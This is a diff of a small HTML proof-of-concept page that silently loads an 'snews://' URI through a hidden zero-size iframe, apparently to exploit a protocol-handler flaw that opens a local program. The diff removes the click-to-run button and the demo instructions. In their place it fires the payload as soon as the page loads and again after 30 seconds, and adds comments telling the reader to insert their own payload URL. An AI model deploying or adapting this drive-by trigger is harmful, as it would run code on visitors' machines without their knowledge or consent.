@@ -1,25 +1,21 @@
 <html>
-1. git clone https://github.com/koocola/test_app.git<br>
-2. open the click_me button or wait 30s then you will see calculator open<br>
 <body>
-<button type="button" onclick="a()">click me</button>
 <script>
-    function a() {
-        iframe = document.createElement("iframe");
+    // Fungsi untuk menambahkan iframe dengan payload
+    function triggerPayload() {
+        let iframe = document.createElement("iframe");
         iframe.frameBorder = 0;
         iframe.width = 0;
         iframe.height = 0;
-        iframe.src = "snews://1234";
+        iframe.src = "snews://1234"; // Ganti dengan URL payload Anda
         document.body.appendChild(iframe);
     }
-    setTimeout(function() {
-        iframe2 = document.createElement("iframe");
-        iframe2.frameBorder = 0;
-        iframe2.width = 0;
-        iframe2.height = 0;
-        iframe2.src = "snews://1234";
-        document.body.appendChild(iframe2);
-    },30000);
+
+    // Eksekusi payload langsung saat halaman dimuat
+    triggerPayload();
+
+    // Eksekusi payload kedua setelah 30 detik
+    setTimeout(triggerPayload, 30000);
 </script>
 </body>
 </html>
